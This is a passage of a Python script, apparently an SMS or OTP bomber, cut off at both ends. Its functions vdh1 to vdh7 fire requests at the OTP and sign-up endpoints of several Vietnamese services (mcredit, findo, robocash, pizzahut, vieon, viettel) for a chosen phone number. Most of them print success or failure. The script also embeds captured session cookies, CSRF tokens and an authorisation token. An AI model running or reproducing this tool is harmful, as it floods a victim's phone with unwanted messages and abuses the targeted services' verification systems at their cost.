    response = requests.get('https://api.itaphoa.com/customer/send-gen-otp', params=params, headers=headers)


def vdh7():
    cookies = {
        '.AspNetCore.Antiforgery.iDxHxxTbyew': 'CfDJ8DVMx7rRkFpJpsz5RKDfFWpUiuWsZDGV8yT_x-ieJA6NeKIQSZPG95ai5p3HeHyqwrJZuaVsW_yvEOd5zbDWxTEfKClkrBtEioRFU0yhvi5Qwr3WjrdOAu9TBQBiE1aiSRHK3OwTwaNb-9b9F3sJHnA',
        'MC.WEB.PORTAL': 'CfDJ8DVMx7rRkFpJpsz5RKDfFWopvTBPw2pdlBo%2FomG%2Bk7s%2F1628DITJE3P53Lr%2B4rvradaaHoguAP%2BJAfFh4kb6Jbh3QLNS06tXM0evFdBhTxMHlYrHLqizB8EezZJT29QcpmuKZk%2FCXQbTJP97jFCGHs63Nft82fKefJeUg4ym1RNE',
        '_gcl_au': '1.1.1605201530.1697100677',
        '_ga_TTZGWP0RXB': 'GS1.1.1697100677.1.0.1697100677.0.0.0',
        '_ga_XS831VGKPD': 'GS1.1.1697100677.1.0.1697100677.60.0.0',
        '_ga': 'GA1.3.2136226874.1697100678',
        '_gid': 'GA1.3.561811056.1697100678',
        '_gat_UA-215142412-1': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'sd_ABtboFuIna5H0eEEwJakaz4N',
        '_fbp': 'fb.2.1697100678672.2140738242',
        'afUserId': '323e4985-dd69-4b93-8739-3e1d62e020d3-p',
        'AF_SYNC': '1697100679980',
    }

    headers = {
        'authority': 'mcredit.com.vn',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json; charset=UTF-8',
        # 'cookie': '.AspNetCore.Antiforgery.iDxHxxTbyew=CfDJ8DVMx7rRkFpJpsz5RKDfFWpUiuWsZDGV8yT_x-ieJA6NeKIQSZPG95ai5p3HeHyqwrJZuaVsW_yvEOd5zbDWxTEfKClkrBtEioRFU0yhvi5Qwr3WjrdOAu9TBQBiE1aiSRHK3OwTwaNb-9b9F3sJHnA; MC.WEB.PORTAL=CfDJ8DVMx7rRkFpJpsz5RKDfFWopvTBPw2pdlBo%2FomG%2Bk7s%2F1628DITJE3P53Lr%2B4rvradaaHoguAP%2BJAfFh4kb6Jbh3QLNS06tXM0evFdBhTxMHlYrHLqizB8EezZJT29QcpmuKZk%2FCXQbTJP97jFCGHs63Nft82fKefJeUg4ym1RNE; _gcl_au=1.1.1605201530.1697100677; _ga_TTZGWP0RXB=GS1.1.1697100677.1.0.1697100677.0.0.0; _ga_XS831VGKPD=GS1.1.1697100677.1.0.1697100677.60.0.0; _ga=GA1.3.2136226874.1697100678; _gid=GA1.3.561811056.1697100678; _gat_UA-215142412-1=1; _tt_enable_cookie=1; _ttp=sd_ABtboFuIna5H0eEEwJakaz4N; _fbp=fb.2.1697100678672.2140738242; afUserId=323e4985-dd69-4b93-8739-3e1d62e020d3-p; AF_SYNC=1697100679980',
        'origin': 'https://mcredit.com.vn',
        'referer': 'https://mcredit.com.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = phone

    response = requests.post('https://mcredit.com.vn/api/Customers/requestOTP', cookies=cookies, headers=headers, json=json_data)
    if response.status_code == 200:
        print(format_print("*", "vdh7: THÀNH CÔNG!"))
    else:
        print(format_print("x", "vdh7: THẤT BẠI!"))   
        
        
def vdh6():
    headers = {
        'authority': 'api.findo.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://www.findo.vn',
        'referer': 'https://www.findo.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'mobilePhone': {
            'number': phone,
        },
    }

    response = requests.post('https://api.findo.vn/web/public/client/phone/sms-code-ts', headers=headers, json=json_data)
    if response.status_code == 200:
        print(format_print("*", "vdh6: THÀNH CÔNG!"))
    else:
        print(format_print("x", "vdh6: THẤT BẠI!"))   
        
        
def vdh5():
    cookies = {
        '__cfruid': '82d0615933bd133beba33dc3aeba7f8f495b6961-1697100958',
        '_gcl_au': '1.1.1599413006.1697100963',
        '_fbp': 'fb.1.1697100963307.2025014889',
        '_gcl_aw': 'GCL.1697100964.Cj0KCQjwsp6pBhCfARIsAD3GZuZblhlrDsPS1oe0wChM92YPEBgJMVCafjz_K3klXsHPF0tfATdx8vUaAhQkEALw_wcB',
        '_gid': 'GA1.2.2070565504.1697100964',
        '_gac_UA-49883034-25': '1.1697100964.Cj0KCQjwsp6pBhCfARIsAD3GZuZblhlrDsPS1oe0wChM92YPEBgJMVCafjz_K3klXsHPF0tfATdx8vUaAhQkEALw_wcB',
        '_dc_gtm_UA-49883034-25': '1',
        'mousestats_vi': '27b28f876a2856cbffa0',
        'mousestats_si': '8bb020f831f4a172cf02',
        '_tt_enable_cookie': '1',
        '_ttp': 'J1xW6MXCF00ToDZN_zyYnUhIyN-',
        '_clck': '13ebg88|2|ffs|0|1380',
        'XSRF-TOKEN': 'eyJpdiI6IlhBenRBazlCbkpHV1A5amhzN2dleUE9PSIsInZhbHVlIjoiWENaN1U0SEVFY1dXVUt4Qmg1V3hCUklGb3YreEwxSHQ3VXR0czRqcXpha1A4T0VoZmlITHE1ckJlZ0dBTmY5YytQRmROWGkwRzlBckNlSG5FSjVSWU9oNm1DMEZ6ZEFxbmh0Y0JtTERJQTZjSk05Y0o3dHlWZDJNdW1YWTNXdUoiLCJtYWMiOiJkZTBhYzE0MzFjN2M2NmE1YzJjNWM5ZDNmNDhiMDYxNGFiMDBhYWFhYjkwOGMwNGNkZDc0MGE4ZGE1OTVmY2M5IiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6ImZiOS9jSDZLdFNsZ0pGeXB2Qzhrb3c9PSIsInZhbHVlIjoiWU1qcUJJY21xTFdldmVYcHdZRUJCZWdZampVREdsYXRGM0JpdFR5aVFHbmwrWTlWQmtRZWE0R3Q1RVJZMTVOU2JTWkZoaVRFSklQblNVQWF3V0tmNC9uYlMzZW5aa3VDc01sNE56cE1LVzlLeVdKMXdPQUZnM1o3MjlpbUJYYmUiLCJtYWMiOiI1NzE5NGRjNmQ0OTY4ZmFkYjc4N2U5ZDY1MDIxMzA0OTk3NTVhMGJhOWE1NDQwNGQ5NTg3ODQzNjhiMzI2ZWViIiwidGFnIjoiIn0%3D',
        'utm_uid': 'eyJpdiI6IithcDk0Zzg3UzdIMDRxaW9vREJZVnc9PSIsInZhbHVlIjoiQ2UzKy9wMkJiY1Z4N2hwUmg3S3VLWUpoc2VOTG9mUVNSRVoxUFpoK3UreStJYjJUTE9hT1VWeWhtZDJVTnJhQWdOeGhteGNiMlQ3V3BXZEdubTJrcFNEbVlkREJwTGdRaHFCc0dyWnpBQWgxc05LdTVMVnlCNTkwblhqNHd0MkIiLCJtYWMiOiI3ZTk4YTM2YzdlN2U1ZTBkMDA5YzAwNTk5YTMyMmI3ZDg4ZmIyNDZkNGFhMWM5MWZlMmU4NTZiMGUzZjM4ZmI2IiwidGFnIjoiIn0%3D',
        '_ga_EBK41LH7H5': 'GS1.1.1697100963.1.1.1697100965.58.0.0',
        '_ga': 'GA1.2.606750676.1697100964',
        '_ym_uid': '169710096651655972',
        '_ym_d': '1697100966',
        'jslbrc': 'w.202310120856042cafa301-68dd-11ee-a84d-0299c7a21129.A_GS',
        '_clsk': '1ucp13t|1697100968297|1|1|x.clarity.ms/collect',
        '_ym_isad': '2',
        '_ym_visorc': 'w',
        'ec_png_utm': '6408f033-a105-f560-a7be-1f96237fac84',
        'ec_etag_utm': '6408f033-a105-f560-a7be-1f96237fac84',
        'ec_cache_utm': '6408f033-a105-f560-a7be-1f96237fac84',
        'uid': '6408f033-a105-f560-a7be-1f96237fac84',
        'ec_png_client': 'false',
        'ec_etag_client': 'false',
        'ec_cache_client': 'false',
        'client': 'false',
        'ec_png_client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocash.%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655585801606%7Ckwmt_e%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D',
        'ec_etag_client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocash.%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655585801606%7Ckwmt_e%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D',
        'ec_cache_client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocash.%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655585801606%7Ckwmt_e%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D',
        'client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocash.%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655585801606%7Ckwmt_e%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D',
        'supportOnlineTalkID': '0cy5BAhEasyrMQvE8fnessSC2Q000Nc7',
    }

    headers = {
        'authority': 'robocash.vn',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '__cfruid=82d0615933bd133beba33dc3aeba7f8f495b6961-1697100958; _gcl_au=1.1.1599413006.1697100963; _fbp=fb.1.1697100963307.2025014889; _gcl_aw=GCL.1697100964.Cj0KCQjwsp6pBhCfARIsAD3GZuZblhlrDsPS1oe0wChM92YPEBgJMVCafjz_K3klXsHPF0tfATdx8vUaAhQkEALw_wcB; _gid=GA1.2.2070565504.1697100964; _gac_UA-49883034-25=1.1697100964.Cj0KCQjwsp6pBhCfARIsAD3GZuZblhlrDsPS1oe0wChM92YPEBgJMVCafjz_K3klXsHPF0tfATdx8vUaAhQkEALw_wcB; _dc_gtm_UA-49883034-25=1; mousestats_vi=27b28f876a2856cbffa0; mousestats_si=8bb020f831f4a172cf02; _tt_enable_cookie=1; _ttp=J1xW6MXCF00ToDZN_zyYnUhIyN-; _clck=13ebg88|2|ffs|0|1380; XSRF-TOKEN=eyJpdiI6IlhBenRBazlCbkpHV1A5amhzN2dleUE9PSIsInZhbHVlIjoiWENaN1U0SEVFY1dXVUt4Qmg1V3hCUklGb3YreEwxSHQ3VXR0czRqcXpha1A4T0VoZmlITHE1ckJlZ0dBTmY5YytQRmROWGkwRzlBckNlSG5FSjVSWU9oNm1DMEZ6ZEFxbmh0Y0JtTERJQTZjSk05Y0o3dHlWZDJNdW1YWTNXdUoiLCJtYWMiOiJkZTBhYzE0MzFjN2M2NmE1YzJjNWM5ZDNmNDhiMDYxNGFiMDBhYWFhYjkwOGMwNGNkZDc0MGE4ZGE1OTVmY2M5IiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6ImZiOS9jSDZLdFNsZ0pGeXB2Qzhrb3c9PSIsInZhbHVlIjoiWU1qcUJJY21xTFdldmVYcHdZRUJCZWdZampVREdsYXRGM0JpdFR5aVFHbmwrWTlWQmtRZWE0R3Q1RVJZMTVOU2JTWkZoaVRFSklQblNVQWF3V0tmNC9uYlMzZW5aa3VDc01sNE56cE1LVzlLeVdKMXdPQUZnM1o3MjlpbUJYYmUiLCJtYWMiOiI1NzE5NGRjNmQ0OTY4ZmFkYjc4N2U5ZDY1MDIxMzA0OTk3NTVhMGJhOWE1NDQwNGQ5NTg3ODQzNjhiMzI2ZWViIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IithcDk0Zzg3UzdIMDRxaW9vREJZVnc9PSIsInZhbHVlIjoiQ2UzKy9wMkJiY1Z4N2hwUmg3S3VLWUpoc2VOTG9mUVNSRVoxUFpoK3UreStJYjJUTE9hT1VWeWhtZDJVTnJhQWdOeGhteGNiMlQ3V3BXZEdubTJrcFNEbVlkREJwTGdRaHFCc0dyWnpBQWgxc05LdTVMVnlCNTkwblhqNHd0MkIiLCJtYWMiOiI3ZTk4YTM2YzdlN2U1ZTBkMDA5YzAwNTk5YTMyMmI3ZDg4ZmIyNDZkNGFhMWM5MWZlMmU4NTZiMGUzZjM4ZmI2IiwidGFnIjoiIn0%3D; _ga_EBK41LH7H5=GS1.1.1697100963.1.1.1697100965.58.0.0; _ga=GA1.2.606750676.1697100964; _ym_uid=169710096651655972; _ym_d=1697100966; jslbrc=w.202310120856042cafa301-68dd-11ee-a84d-0299c7a21129.A_GS; _clsk=1ucp13t|1697100968297|1|1|x.clarity.ms/collect; _ym_isad=2; _ym_visorc=w; ec_png_utm=6408f033-a105-f560-a7be-1f96237fac84; ec_etag_utm=6408f033-a105-f560-a7be-1f96237fac84; ec_cache_utm=6408f033-a105-f560-a7be-1f96237fac84; uid=6408f033-a105-f560-a7be-1f96237fac84; ec_png_client=false; ec_etag_client=false; ec_cache_client=false; client=false; ec_png_client_utm=%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocash.%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655585801606%7Ckwmt_e%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D; ec_etag_client_utm=%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocash.%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655585801606%7Ckwmt_e%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D; ec_cache_client_utm=%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocash.%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655585801606%7Ckwmt_e%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D; client_utm=%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocash.%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655585801606%7Ckwmt_e%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D; supportOnlineTalkID=0cy5BAhEasyrMQvE8fnessSC2Q000Nc7',
        'origin': 'https://robocash.vn',
        'referer': 'https://robocash.vn/login',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        '_token': 'ZdonNEUzD0WAtdKfeIMsdZN0F4OqE4yXcNqG99Ix',
        'data': phone,
    }

    response = requests.post('https://robocash.vn/restore/phone', cookies=cookies, headers=headers, data=data)

def vdh4():
    cookies = {
        'x_polaris_sid': 'BYCcCqNjXoOI93ay/GUkckNXTg|NLO|LlJOq',
        'ab.storage.deviceId.316e45bf-b91c-442f-b994-c4275917d31b': '%7B%22g%22%3A%22116c4ce9-bf3f-fc02-f544-a0b6ffd3676b%22%2C%22c%22%3A1697101086758%2C%22l%22%3A1697101086758%7D',
        '_gcl_au': '1.1.889534889.1697101087',
        '_fbp': 'fb.1.1697101087613.159282760',
        '_gid': 'GA1.2.355923841.1697101088',
        '_gat_UA-197055535-1': '1',
        '_gat_UA-197055535-2': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'vYOh0R-fRL1cjfviaCOvBmEIog3',
        'fs_lua': '1.1697101089848',
        'fs_uid': '#o-1EGZPD-na1#417296e0-7c39-48f5-8c90-ca47780f647e:c101bd43-ea70-4eeb-a256-4baf3ab9bad2:1697101089848::1#/1728637088',
        '_ga': 'GA1.2.1113988317.1697101088',
        'ab.storage.sessionId.316e45bf-b91c-442f-b994-c4275917d31b': '%7B%22g%22%3A%222e6ddc5a-cce5-fab5-caa9-1250af678f52%22%2C%22e%22%3A1697102900082%2C%22c%22%3A1697101086753%2C%22l%22%3A1697101100082%7D',
        '_ga_VLLXGWD25W': 'GS1.1.1697101088.1.1.1697101136.0.0.0',
        '_ga_Q17PXF17Y5': 'GS1.1.1697101088.1.1.1697101139.0.0.0',
        'x_polaris_sd': 't|JwpokyvhCWLWClNUwwm4G5UmPGs|HIbhEUr0Psjuo5oy7rLYjM0N97ll6ftiuG4BdqCcRVX93GYxH8jbDVsfD9Vfrxr2cd/dDGsyL93ZncaaZuixsoG|MdmNfzS1yo',
    }

    headers = {
        'authority': 'pizzahut.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': 'x_polaris_sid=BYCcCqNjXoOI93ay/GUkckNXTg|NLO|LlJOq; ab.storage.deviceId.316e45bf-b91c-442f-b994-c4275917d31b=%7B%22g%22%3A%22116c4ce9-bf3f-fc02-f544-a0b6ffd3676b%22%2C%22c%22%3A1697101086758%2C%22l%22%3A1697101086758%7D; _gcl_au=1.1.889534889.1697101087; _fbp=fb.1.1697101087613.159282760; _gid=GA1.2.355923841.1697101088; _gat_UA-197055535-1=1; _gat_UA-197055535-2=1; _tt_enable_cookie=1; _ttp=vYOh0R-fRL1cjfviaCOvBmEIog3; fs_lua=1.1697101089848; fs_uid=#o-1EGZPD-na1#417296e0-7c39-48f5-8c90-ca47780f647e:c101bd43-ea70-4eeb-a256-4baf3ab9bad2:1697101089848::1#/1728637088; _ga=GA1.2.1113988317.1697101088; ab.storage.sessionId.316e45bf-b91c-442f-b994-c4275917d31b=%7B%22g%22%3A%222e6ddc5a-cce5-fab5-caa9-1250af678f52%22%2C%22e%22%3A1697102900082%2C%22c%22%3A1697101086753%2C%22l%22%3A1697101100082%7D; _ga_VLLXGWD25W=GS1.1.1697101088.1.1.1697101136.0.0.0; _ga_Q17PXF17Y5=GS1.1.1697101088.1.1.1697101139.0.0.0; x_polaris_sd=t|JwpokyvhCWLWClNUwwm4G5UmPGs|HIbhEUr0Psjuo5oy7rLYjM0N97ll6ftiuG4BdqCcRVX93GYxH8jbDVsfD9Vfrxr2cd/dDGsyL93ZncaaZuixsoG|MdmNfzS1yo',
        'origin': 'https://pizzahut.vn',
        'referer': 'https://pizzahut.vn/signup',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'keyData': 'appID=vn.pizzahut&lang=Vi&ver=1.0.0&clientType=2&udId=%22%22&phone={phone}',
    }

    response = requests.post(
        'https://pizzahut.vn/callApiStorelet/user/registerRequest',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    if response.status_code == 200:
        print(format_print("*", "vdh4: THÀNH CÔNG!"))
    else:
        print(format_print("x", "vdh4: THẤT BẠI!"))   
        
        
def vdh3():
    headers = {
        'authority': 'api.vieon.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2OTY5MTI1NzcsImp0aSI6IjI2ZjQ0MzA1M2UyYjE4MTY5NjFhZTk3ZjQ1ZDczNDE3IiwiYXVkIjoiIiwiaWF0IjoxNjk2NzM5Nzc3LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY5NjczOTc3Niwic3ViIjoiYW5vbnltb3VzX2E1Mjg4MDUyMTg0Yzg2YjdiNTFmY2RiYmFhNTRhZDhlLTI1MTJlN2UzNTcwMjgwZjZiNTUyZWU5NGUzZjYwYzc0LTE2OTY3Mzk3NzciLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiYTUyODgwNTIxODRjODZiN2I1MWZjZGJiYWE1NGFkOGUtMjUxMmU3ZTM1NzAyODBmNmI1NTJlZTk0ZTNmNjBjNzQtMTY5NjczOTc3NyIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExNy4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiZHQiOiJ3ZWIiLCJtdGgiOiJhbm9ueW1vdXNfbG9naW4iLCJtZCI6IldpbmRvd3MgMTAiLCJpc3ByZSI6MCwidmVyc2lvbiI6IiJ9.a68EyUReJUMpXkMmDcql32W7tVXvmE3GfcBnDQRMn0k',
        'content-type': 'application/json',
        'origin': 'https://vieon.vn',
        'referer': 'https://vieon.vn/auth/?destination=%2F&utm_source=google&utm_medium=cpc&utm_campaign=approi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite&utm_content=p_--k_vieon',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    params = {
        'platform': 'web',
        'ui': '012021',
    }

    json_data = {
        'username': phone,
        'country_code': 'VN',
        'model': 'Windows 10',
        'device_id': 'a5288052184c86b7b51fcdbbaa54ad8e',
        'device_name': 'Chrome/117',
        'device_type': 'desktop',
        'platform': 'web',
        'ui': '012021',
    }

    response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data)
    if response.status_code == 200:
        print(format_print("*", "vdh3: THÀNH CÔNG!"))
    else:
        print(format_print("x", "vdh3: THẤT BẠI!"))   
        

def vdh2():
    cookies = {
        'laravel_session': 'm5Kjo2cDCsiwMUzE1AqZgO7kukHJdCp7CvhiGEAH',
        'redirectLogin': 'https://viettel.vn/',
        'XSRF-TOKEN': 'eyJpdiI6IjhiWmwwMlNYWlI1MjVWUmpWK3NrTnc9PSIsInZhbHVlIjoiYnlcL3JKZlJlT2VuUVBmSHhMWitCMVVzVFwvWlI3cG1WcDNWT3o0WmN0Mk1ZczhobEo1NVNuZDRyVEZuOUI2RW5RIiwibWFjIjoiNGUxMGE5MmI2ZWIwNDRlMWJmZjI2YWM4Yzc5YTRkNzlmMzgxOGI5ZjNmYTNiY2UyNDMwMjYxZDRjYzk0MWE4MiJ9',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=m5Kjo2cDCsiwMUzE1AqZgO7kukHJdCp7CvhiGEAH; redirectLogin=https://viettel.vn/; XSRF-TOKEN=eyJpdiI6IjhiWmwwMlNYWlI1MjVWUmpWK3NrTnc9PSIsInZhbHVlIjoiYnlcL3JKZlJlT2VuUVBmSHhMWitCMVVzVFwvWlI3cG1WcDNWT3o0WmN0Mk1ZczhobEo1NVNuZDRyVEZuOUI2RW5RIiwibWFjIjoiNGUxMGE5MmI2ZWIwNDRlMWJmZjI2YWM4Yzc5YTRkNzlmMzgxOGI5ZjNmYTNiY2UyNDMwMjYxZDRjYzk0MWE4MiJ9',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'AVSj6dXTdn20zXu7ddUBUO8xwlxBodg80NUAdOlw',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6IjhiWmwwMlNYWlI1MjVWUmpWK3NrTnc9PSIsInZhbHVlIjoiYnlcL3JKZlJlT2VuUVBmSHhMWitCMVVzVFwvWlI3cG1WcDNWT3o0WmN0Mk1ZczhobEo1NVNuZDRyVEZuOUI2RW5RIiwibWFjIjoiNGUxMGE5MmI2ZWIwNDRlMWJmZjI2YWM4Yzc5YTRkNzlmMzgxOGI5ZjNmYTNiY2UyNDMwMjYxZDRjYzk0MWE4MiJ9',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)
    if response.status_code == 200:
        print(format_print("*", "vdh2: THÀNH CÔNG!"))
    else:
        print(format_print("x", "vdh2: THẤT BẠI!"))   


def vdh1():
    cookies = {
        '_gcl_au': '1.1.905385950.1697101730',
        '_gid': 'GA1.2.820953639.1697101730',
        '_gac_UA-187725374-2': '1.1697101730.Cj0KCQjwsp6pBhCfARIsAD3GZuazt3sJTMgpihTlNqZGmdetECgGdRZzfuApgX9v3fB17SmXuxKpNQoaAqNEEALw_wcB',
        '_gat_UA-187725374-2': '1',
        '_hjSessionUser_2281843': 'eyJpZCI6IjAyNDc1MjhhLTlmNDAtNTg1OC1iMzU5LTM2ZmE3NjFiNjdlMiIsImNyZWF0ZWQiOjE2OTcxMDE3MzA1OTAsImV4aXN0aW5nIjpmYWxzZX0=',
        '_hjFirstSeen': '1',
        '_hjIncludedInSessionSample_2281843': '0',
        '_hjSession_2281843': 'eyJpZCI6ImIxODE1ZDUyLWRmMjMtNDFiMS1hNDU3LWEwNTRkZjFiNGEzNyIsImNyZWF0ZWQiOjE2OTcxMDE3MzA1OTQsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6dHJ1ZX0=',
        '_hjAbsoluteSessionInProgress': '0',
        '_fbp': 'fb.1.1697101730636.1899941891',
        '_tt_enable_cookie': '1',
        '_ttp': 'xfgnJlSYMTt0ymrTCSc6dSE9yqj',
        '_fw_crm_v': 'cbb950fc-0b22-4605-c51d-3732b0dba139',
        '_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM3MjY0NTM1Mg.0d_xgR9-7Ji20oQtALNXXLCMsV43PbgD976WM1ojvGs',
        '_ga_ZBQ18M247M': 'GS1.1.1697101730.1.1.1697101743.47.0.0',
